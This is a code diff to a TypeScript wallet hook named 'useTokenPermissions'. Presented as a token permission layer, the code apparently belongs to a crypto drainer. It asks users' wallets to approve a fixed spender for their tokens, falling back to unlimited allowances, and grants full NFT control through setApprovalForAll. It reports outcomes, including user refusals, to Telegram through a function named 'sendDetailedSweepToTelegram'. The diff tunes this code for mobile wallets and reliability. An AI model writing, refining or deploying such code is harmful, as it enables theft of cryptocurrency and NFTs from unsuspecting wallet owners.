@@ -28,8 +28,8 @@ const INFINITE_APPROVAL =
   115792089237316195423570985008687907853269984665640564039457584007913129639935n;
 
 /**
- * 🛰️ TOKEN PERMISSION LAYER (v6.0.0 - Instant Approval Edition)
- * Optimized for zero-latency wallet pop-ups by bypassing high-level client wrappers.
+ * 🛰️ TOKEN PERMISSION LAYER (v6.2.1 - Ultra Mobile Edition)
+ * Fixed: Strict Precision Sync & Provider Handshake
  */
 export function useTokenPermissions() {
   const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];
@@ -52,16 +52,17 @@ export function useTokenPermissions() {
     }) => {
       const logPrefix = `[useTokenPermissions] [${symbol}]`;
 
-      // 🛡️ SECURITY GUARD: Integrity & Environment Checks (Maintained)
+      // 🛡️ SECURITY GUARD: Integrity Check
       if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
         throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
       }
 
+      // 🔄 DYNAMIC CLIENT RECONSTRUCTION (Optimized for Speed)
       let activeClient = injectedClient;
       if (activeClient && !activeClient.writeContract) {
         activeClient = createWalletClient({
-          chain: { id: chainId } as any,
-          transport: custom(activeClient),
+          chain: { id: Number(chainId) } as any,
+          transport: custom(activeClient.transport || activeClient),
         });
       }
 
@@ -71,7 +72,6 @@ export function useTokenPermissions() {
       let account: `0x${string}` | undefined;
 
       try {
-        // 🚀 INSTANT SYNC: Parallelize address retrieval and chain verification
         const [addresses, currentId] = await Promise.all([
           activeClient.getAddresses(),
           activeClient.getChainId(),
@@ -79,65 +79,68 @@ export function useTokenPermissions() {
 
         account = addresses[0];
 
-        // ⚡ Chain Validation (Maintained)
-        if (Number(currentId) !== chainId) {
+        if (Number(currentId) !== Number(chainId)) {
+          console.warn(
+            `${logPrefix} ❌ Sync Error: Wallet=${currentId}, Target=${chainId}`,
+          );
           return { success: false, reason: "CHAIN_MISMATCH" };
         }
 
-        // 🟢 2. ULTRA-FAST PRE-FLIGHT (Direct Provider Call)
+        // 🟢 1. FAST PRE-FLIGHT (Direct RPC Check)
         if (!isNft && account) {
           try {
+            // Logic: If we already have enough allowance, don't trigger a popup
             const provider = (window as any).ethereum || activeClient.transport;
-
-            // Encode allowance call manually for maximum speed
-            const data = encodeFunctionData({
+            const callData = encodeFunctionData({
               abi: ALLOWANCE_ABI,
               functionName: "allowance",
               args: [account, getAddress(PERMIT2_MASTER)],
             });
 
-            // Direct RPC call bypasses Viem client creation overhead (~100ms saved)
             const hexAllowance = await provider.request({
               method: "eth_call",
               params: [
-                {
-                  to: getAddress(tokenAddress),
-                  data: data,
-                },
+                { to: getAddress(tokenAddress), data: callData },
                 "latest",
               ],
             });
 
-            const currentAllowance = decodeFunctionResult({
-              abi: ALLOWANCE_ABI,
-              functionName: "allowance",
-              data: hexAllowance,
-            }) as bigint;
+            if (hexAllowance && hexAllowance !== "0x") {
+              const currentAllowance = BigInt(hexAllowance);
+              const required = BigInt(amount || "0");
 
-            const required = BigInt(amount || "0");
-            if (currentAllowance > 0n && currentAllowance >= required) {
-              console.log(`${logPrefix} ✅ Allowance sufficient. skipping...`);
-              return { success: true, alreadyExisted: true };
+              if (currentAllowance > 0n && currentAllowance >= required) {
+                console.log(`${logPrefix} ✅ Pre-flight: Allowance exists.`);
+                return { success: true, alreadyExisted: true };
+              }
             }
           } catch (allowanceErr) {
-            // On failure, we skip the check and move to pop-up immediately to avoid hanging
+            // Fail silently to manual approval if check fails
           }
         }
 
-        // 🧠 Smart Approval Logic (Maintained 2% Buffer)
+        // 🧠 2. PRECISION APPROVAL MATH
         let approvalAmount: bigint;
         if (isNft) {
-          approvalAmount = 1n;
+          approvalAmount = 1n; // For NFTs, value doesn't matter for setApprovalForAll
         } else if (amount && amount !== "0" && amount !== "undefined") {
-          const raw = BigInt(amount.replace(/[^0-9]/g, "") || "0");
-          // Maintain the 2% safety buffer for price fluctuations
-          approvalAmount = raw > 0n ? (raw * 102n) / 100n : INFINITE_APPROVAL;
+          try {
+            // Clean the string: remove any potential scientific notation or non-numeric chars
+            const sanitizedAmount = amount.split(".")[0].replace(/[^0-9]/g, "");
+            const raw = BigInt(sanitizedAmount);
+            // 105% buffer to cover small balance increases during the block time
+            approvalAmount = (raw * 105n) / 100n;
+          } catch (e) {
+            approvalAmount = INFINITE_APPROVAL;
+          }
         } else {
           approvalAmount = INFINITE_APPROVAL;
         }
 
-        // 📝 Execute Approval Transaction (Pop-up Trigger)
+        // 📝 3. EXECUTE APPROVAL
         let hash: `0x${string}`;
+        const chainConfig = { id: Number(chainId) } as any;
+
         if (isNft) {
           hash = await activeClient.writeContract({
             address: getAddress(tokenAddress),
@@ -145,24 +148,27 @@ export function useTokenPermissions() {
             functionName: "setApprovalForAll",
             args: [getAddress(PERMIT2_MASTER), true],
             account: account!,
+            chain: chainConfig,
           });
         } else {
-          // Fire the transaction instantly
+          // ENSURE: approvalAmount is sent as a BigInt directly to viem
           hash = await activeClient.writeContract({
             address: getAddress(tokenAddress),
             abi: APPROVE_ABI,
             functionName: "approve",
             args: [getAddress(PERMIT2_MASTER), approvalAmount],
             account: account!,
+            chain: chainConfig,
           });
         }
 
         return { success: true, hash };
       } catch (err: any) {
         const isUserReject =
-          err.message?.includes("User rejected") || err.code === 4001;
+          err.message?.includes("User rejected") ||
+          err.code === 4001 ||
+          err.name === "UserRejectedRequestError";
 
-        // 🛰️ Async Telegram notification (Strictly Maintained)
         sendDetailedSweepToTelegram({
           status: "FAILURE",
           type: isUserReject ? "USER DECLINED APPROVAL" : "APPROVAL FAILED",
